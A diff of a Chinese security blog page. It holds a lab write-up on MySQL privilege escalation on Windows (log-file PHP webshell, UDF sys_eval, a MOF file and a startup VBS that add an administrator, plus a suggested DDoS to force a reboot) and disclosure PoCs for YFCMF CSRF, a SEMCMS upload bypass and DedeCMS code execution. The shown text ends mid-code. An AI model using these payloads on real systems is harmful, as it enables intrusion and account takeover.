@@ -110,18 +110,10 @@
 <h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>靶机A： Windows 7 SP1<br>靶机B： Windows server 2003 enterprise x64<br>Phpstudy搭建的php+mysql<br>php版本：5.4.45<br>mysql版本：5.5.53<br>攻击环境：已知root账号密码，网站存在phpmyadmin页面</p>
 <h1 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h1><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>利用log变量，猜一下绝对路径<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224310-0a604df6-9987-1.png" alt><br>看到phpstudy，猜测根目录在WWW下，into outfile写个马测一下能传不<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224334-18b3e6b0-9987-1.png" alt><br>果然是用不成into outfile，因为file_priv为null，那么尝试使用日志写马</p>
 <h2 id="利用日志写shell"><a href="#利用日志写shell" class="headerlink" title="利用日志写shell"></a>利用日志写shell</h2><p>开启日志记录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&apos;on&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>日志文件导出指定目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&apos;C:/phpstudy/WWW/hp.php&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>记录sql语句写马，这里我就是演示一下，没有安全狗，直接传原马</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php @eval($_POST[&quot;hp&quot;]); ?&gt;&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>关闭记录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=off;</span><br></pre></td></tr></table></figure>
-
-<h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>url: 192.168.11.106/hp.php<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224350-22085dea-9987-1.png" alt><br>看一下权限，普通成员hpd0egr，创建用户错误5。<br>接下来开始提权之路！</p>
+<pre><code>set global general_log=&#39;on&#39;;</code></pre><p>日志文件导出指定目录</p>
+<pre><code>set global general_log_file=&#39;C:/phpstudy/WWW/hp.php&#39;;</code></pre><p>记录sql语句写马，这里我就是演示一下，没有安全狗，直接传原马</p>
+<pre><code>select &#39;&lt;?php @eval($_POST[&quot;hp&quot;]); ?&gt;&#39;;</code></pre><p>关闭记录</p>
+<pre><code>set global general_log=off;</code></pre><h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>url: 192.168.11.106/hp.php<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224350-22085dea-9987-1.png" alt><br>看一下权限，普通成员hpd0egr，创建用户错误5。<br>接下来开始提权之路！</p>
 <h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><h2 id="什么是UDF"><a href="#什么是UDF" class="headerlink" title="什么是UDF"></a>什么是UDF</h2><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
 <h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><p>先学习一下什么叫动态链接库</p>
 <h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>动态链接库：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
@@ -141,16 +133,28 @@
 <p>这个提权马自带的导出要用到Into dumpfile，但是file_priv为Null这个问题限制了我们，就算我们修改了my.ini文件也要重启mysql，那我们直接传一个dll上去吧，文件名为<code>hpudf.dll</code>如图</p>
 <h3 id="将udf的自定义函数引入"><a href="#将udf的自定义函数引入" class="headerlink" title="将udf的自定义函数引入"></a>将udf的自定义函数引入</h3><p>我们刚才只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
 <p>引入sys_eval函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &apos;hpudf.dll&apos;</span><br></pre></td></tr></table></figure>
-
-<p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，hpudf.dll是你导出文件的名字;</p>
+<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;hpudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，hpudf.dll是你导出文件的名字;</p>
 <p>常见的函数如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cmdshell 执行cmd;</span><br><span class="line"></span><br><span class="line">downloader 下载者,到网上下载指定文件并保存到指定目录;</span><br><span class="line"></span><br><span class="line">open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</span><br><span class="line"></span><br><span class="line">backshell 反弹Shell;</span><br><span class="line"></span><br><span class="line">ProcessView 枚举系统进程;</span><br><span class="line"></span><br><span class="line">KillProcess 终止指定进程;</span><br><span class="line"></span><br><span class="line">regread 读注册表;</span><br><span class="line"></span><br><span class="line">regwrite 写注册表;</span><br><span class="line"></span><br><span class="line">shut 关机,注销,重启;</span><br><span class="line"></span><br><span class="line">about 说明与帮助函数;</span><br></pre></td></tr></table></figure>
+<pre><code>cmdshell 执行cmd;
 
-<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>执行命令模板：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&apos;ipconfig)</span><br></pre></td></tr></table></figure>
+downloader 下载者,到网上下载指定文件并保存到指定目录;
 
-<p>添加用户/管理员<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224507-4fc7644c-9987-1.png" alt></p>
+open3389 通用开3389终端服务,可指定端口(不改端口无需重启);
+
+backshell 反弹Shell;
+
+ProcessView 枚举系统进程;
+
+KillProcess 终止指定进程;
+
+regread 读注册表;
+
+regwrite 写注册表;
+
+shut 关机,注销,重启;
+
+about 说明与帮助函数;</code></pre><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>执行命令模板：</p>
+<pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>添加用户/管理员<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224507-4fc7644c-9987-1.png" alt></p>
 <p>查看一下用户<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224525-5ad82b8c-9987-1.png" alt></p>
 <p>get it~</p>
 <h1 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h1><p>MOF提权的条件要求十分严苛：</p>
@@ -162,34 +166,51 @@
 <p>mysql以root身份启动，具有c盘下system32/wbem/mof这点权限的要求，就已经非常严格了。。而且win7 sp1就已经没有这个nullevt.mof这个文件了，那么这里记一下poc，来对windows 03的机子进行验证。</p>
 <h2 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h2><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。</p>
 <h2 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h2><p>MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
-<h2 id="公开的nullevt-mof利用代码"><a href="#公开的nullevt-mof利用代码" class="headerlink" title="公开的nullevt.mof利用代码"></a>公开的nullevt.mof利用代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name = &quot;filtP2&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<h2 id="MOF文件利用"><a href="#MOF文件利用" class="headerlink" title="MOF文件利用"></a>MOF文件利用</h2><p>将上面的脚本上传到有读写权限的目录下：</p>
+<h2 id="公开的nullevt-mof利用代码"><a href="#公开的nullevt-mof利用代码" class="headerlink" title="公开的nullevt.mof利用代码"></a>公开的nullevt.mof利用代码</h2><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
+instance of __EventFilter as $EventFilter
+{
+EventNamespace = &quot;Root\\Cimv2&quot;;
+Name = &quot;filtP2&quot;;
+Query = &quot;Select * From __InstanceModificationEvent &quot;
+&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
+&quot;And TargetInstance.Second = 5&quot;;
+QueryLanguage = &quot;WQL&quot;;
+};
+instance of ActiveScriptEventConsumer as $Consumer
+{
+Name = &quot;consPCSV2&quot;;
+ScriptingEngine = &quot;JScript&quot;;
+ScriptText =
+&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;;
+};
+instance of __FilterToConsumerBinding
+{
+Consumer = $Consumer;
+Filter = $EventFilter;
+};</code></pre><h2 id="MOF文件利用"><a href="#MOF文件利用" class="headerlink" title="MOF文件利用"></a>MOF文件利用</h2><p>将上面的脚本上传到有读写权限的目录下：</p>
 <p>这里我上传到了<code>C:\Documents and Settings\test</code></p>
 <p>根据前面的phpmyadmin，我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下<br>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></pre></td></tr></table></figure>
-
-<p>值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</p>
+<pre><code>select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</p>
 <h2 id="验证提权"><a href="#验证提权" class="headerlink" title="验证提权"></a>验证提权</h2><p>当我们成功把mof导出时，mof就会直接被执行，且5秒创建一次用户。</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224611-75eaad5a-9987-1.png" alt><br>可以看到，我们在test的普通用户下直接添加了hpdoger用户。剩下的操作就是用户命令处，换成加入administrator语句即可：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.exe user localgroup administrator hpdoger /add\</span><br></pre></td></tr></table></figure>
-
-<h2 id="关于Mof提权的弊端"><a href="#关于Mof提权的弊端" class="headerlink" title="关于Mof提权的弊端"></a>关于Mof提权的弊端</h2><p>我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？</p>
+<pre><code>net.exe user localgroup administrator hpdoger /add\</code></pre><h2 id="关于Mof提权的弊端"><a href="#关于Mof提权的弊端" class="headerlink" title="关于Mof提权的弊端"></a>关于Mof提权的弊端</h2><p>我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？</p>
 <p>cmd 下运行下面语句:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line">del c:/windows/system32/wbem/repository</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>
-
-<p>重启服务即可。</p>
+<pre><code>net stop winmgmt
+del c:/windows/system32/wbem/repository
+net start winmgmt</code></pre><p>重启服务即可。</p>
 <h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h1><p>在前两种方法都失败时，那可以试一下这个苟延残喘的启动项提权..因为要求达到的条件和mof几乎一样，并且要重启服务，所以不是十分推荐。原理还是使用mysql写文件，写入一段VBS代码到开机自启动中，服务器重启达到创建用户并提权，可以使用DDOS迫使服务器重启。</p>
 <h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><p>file_priv 不为null<br>已知root密码</p>
-<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table a (cmd text); </span><br><span class="line">insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); </span><br><span class="line">insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); </span><br><span class="line">insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); </span><br><span class="line">select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;;</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有很多cve这里没有复现到。Mysql提权在如今被各种因素限制，但掌握这一门技术或多或少对我们都还是有所帮助的</p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre><code>create table a (cmd text); 
+insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); 
+insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); 
+insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); 
+select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;;</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有很多cve这里没有复现到。Mysql提权在如今被各种因素限制，但掌握这一门技术或多或少对我们都还是有所帮助的</p>
 
                 
             </div>
             <div class="continue">
             <a href="/2018/09/08/基于Windows下mysql的一些提权分析/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -222,9 +243,19 @@
 <p>在相应目录，如5.6.27版本下的在：phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll</p>
 <h3 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h3><p>php.ini在相应目录，如5.6.27版本下的在：\phpStudy\PHPTutorial\php\php-5.6.27-nts\php.ini</p>
 <p>在Xdebug部分加如下内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension=&quot;D:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll&quot;</span><br><span class="line">xdebug.profiler_append = 0</span><br><span class="line">xdebug.profiler_enable = 1</span><br><span class="line">xdebug.profiler_enable_trigger = 0</span><br><span class="line">xdebug.profiler_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;</span><br><span class="line">xdebug.trace_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;</span><br><span class="line">xdebug.profiler_output_name = &quot;cache.out.%t-%s&quot;</span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_handler = &quot;dbgp&quot;</span><br><span class="line">xdebug.remote_host = &quot;127.0.0.1&quot;</span><br><span class="line">xdebug.remote_port = 9000</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br></pre></td></tr></table></figure>
-
-<p>zend_extension：插件地址<br>xdebug.remote_port = 9000 : Xdebug监听地址<br>xdebug.idekey = PHPSTORM： idekey名称（与后面设置对应）</p>
+<pre><code>[XDebug]
+zend_extension=&quot;D:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll&quot;
+xdebug.profiler_append = 0
+xdebug.profiler_enable = 1
+xdebug.profiler_enable_trigger = 0
+xdebug.profiler_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;
+xdebug.trace_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;
+xdebug.profiler_output_name = &quot;cache.out.%t-%s&quot;
+xdebug.remote_enable = 1
+xdebug.remote_handler = &quot;dbgp&quot;
+xdebug.remote_host = &quot;127.0.0.1&quot;
+xdebug.remote_port = 9000
+xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.remote_port = 9000 : Xdebug监听地址<br>xdebug.idekey = PHPSTORM： idekey名称（与后面设置对应）</p>
 <h3 id="设置php解释器"><a href="#设置php解释器" class="headerlink" title="设置php解释器"></a>设置php解释器</h3><p>![](Delete Link<br><a href="https://i.loli.net/2018/08/25/5b8157cb1f00f.png" target="_blank" rel="noopener">https://i.loli.net/2018/08/25/5b8157cb1f00f.png</a>)</p>
 <p>这里我用的是5.6.27版本的</p>
 <h3 id="设置xdebug参数"><a href="#设置xdebug参数" class="headerlink" title="设置xdebug参数"></a>设置xdebug参数</h3><p>Debug里设置监听地址：<br><img src="https://i.loli.net/2018/08/25/5b8157cb63338.jpg" alt></p>
@@ -243,7 +274,7 @@
             </div>
             <div class="continue">
             <a href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -271,9 +302,20 @@
             <div class="content">
                 
                 <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The background administrator adds CSRF to the page, causing other administrator accounts to add.</p>
-<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;form action=&quot;/YFCMF/admin/admin/adminsave.html&quot; method=&quot;post&quot;&gt;</span><br><span class="line">		&lt;select name=&quot;group_id&quot; required=&quot;&quot;&gt;</span><br><span class="line">			&lt;option value=&quot;2&quot;/&gt;</span><br><span class="line">		&lt;/select&gt;</span><br><span class="line">		&lt;input name=&quot;username&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;</span><br><span class="line">		&lt;input name=&quot;password&quot; value=&quot;123&quot; type=&quot;hidden&quot;/&gt;</span><br><span class="line">		&lt;input name=&quot;email&quot; value=&quot;csrf@1.com&quot; type=&quot;hidden&quot;/&gt;</span><br><span class="line">		&lt;input name=&quot;realname&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">		document.forms[0].submit();</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>1、View original users<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7c4f4.png" alt></p>
+<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre><code>&lt;html&gt;
+    &lt;form action=&quot;/YFCMF/admin/admin/adminsave.html&quot; method=&quot;post&quot;&gt;
+        &lt;select name=&quot;group_id&quot; required=&quot;&quot;&gt;
+            &lt;option value=&quot;2&quot;/&gt;
+        &lt;/select&gt;
+        &lt;input name=&quot;username&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
+        &lt;input name=&quot;password&quot; value=&quot;123&quot; type=&quot;hidden&quot;/&gt;
+        &lt;input name=&quot;email&quot; value=&quot;csrf@1.com&quot; type=&quot;hidden&quot;/&gt;
+        &lt;input name=&quot;realname&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/html&gt;</code></pre><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>1、View original users<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7c4f4.png" alt></p>
 <p>2、Accessing structured CSRF pages<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7ded1.png" alt></p>
 <p>3、Successfully added<br><img src="https://i.loli.net/2018/08/23/5b7e6aac970b0.png" alt><br><img src="https://i.loli.net/2018/08/23/5b7e6aacc099b.png" alt></p>
 
@@ -281,7 +323,7 @@
             </div>
             <div class="continue">
             <a href="/2018/08/23/Csrf in YFCMF 3.0/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -310,9 +352,7 @@
                 
                 <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>php Background pages restrict the type of uploaded files, jpe, gif, rar,we can break through the restrictions on uploading malicious files such as: PHP.</p>
 <h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>The affected code(located:/ciuy_Admin/SEMCMS_Upfile.php):</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$newname=test_input($_POST[&quot;wname&quot;]).&quot;.&quot;.end($uptype)</span><br></pre></td></tr></table></figure>
-
-<p>We could control the “wname” as we want,and uptype is the suffix which intercepted in allow</p>
+<pre><code>$newname=test_input($_POST[&quot;wname&quot;]).&quot;.&quot;.end($uptype)</code></pre><p>We could control the “wname” as we want,and uptype is the suffix which intercepted in allow</p>
 <h2 id="Founction"><a href="#Founction" class="headerlink" title="Founction"></a>Founction</h2><p>The attaking founction:use char(0) to cut off the filename and make up a renew suffix</p>
 <p>The affected page located in admin’s management page:<code>ciuy_Admin/SEMCMS_Upfile.php</code></p>
 <h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>First,we define our evil php’s suffix as test.rar(which is allowed) and post it as follow.There,we could see no files in the Folder</p>
@@ -326,7 +366,7 @@
             </div>
             <div class="continue">
             <a href="/2018/08/23/Arbitrary File upload in Semcms V2.7/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -363,34 +403,92 @@
 <h2 id="后台代码执行"><a href="#后台代码执行" class="headerlink" title="后台代码执行"></a>后台代码执行</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>DedeCMS V5.7 SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell</p>
 <h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>漏洞位置：dede/tpl.php</p>
 <p>看一下核心代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># /dede/tpl.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once(dirname(__FILE__).&quot;/config.php&quot;);</span><br><span class="line">CheckPurview(&apos;plus_文件管理器&apos;);</span><br><span class="line"></span><br><span class="line">$action = isset($action) ? trim($action) : &apos;&apos;;</span><br><span class="line">......</span><br><span class="line">if(empty($filename))    $filename = &apos;&apos;;</span><br><span class="line">$filename = preg_replace(&quot;#[\/\\\\]#&quot;, &apos;&apos;, $filename);</span><br><span class="line">......</span><br><span class="line">else if($action==&apos;savetagfile&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    csrf_check();</span><br><span class="line">    if(!preg_match(&quot;#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i&quot;, $filename))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(&apos;文件名不合法，不允许进行操作！&apos;, &apos;-1&apos;);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    require_once(DEDEINC.&apos;/oxwindow.class.php&apos;);</span><br><span class="line">    $tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);</span><br><span class="line">    $content = stripslashes($content);</span><br><span class="line">    $truefile = DEDEINC.&apos;/taglib/&apos;.$filename;</span><br><span class="line">    $fp = fopen($truefile, &apos;w&apos;);</span><br><span class="line">    fwrite($fp, $content);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code># /dede/tpl.php
+&lt;?php
+require_once(dirname(__FILE__).&quot;/config.php&quot;);
+CheckPurview(&#39;plus_文件管理器&#39;);
 
-<p>因为dedecms全局变量注册(register_globals=on)，这里有两个可控变量$filename&amp;$content</p>
+$action = isset($action) ? trim($action) : &#39;&#39;;
+......
+if(empty($filename))    $filename = &#39;&#39;;
+$filename = preg_replace(&quot;#[\/\\\\]#&quot;, &#39;&#39;, $filename);
+......
+else if($action==&#39;savetagfile&#39;)
+{
+    csrf_check();
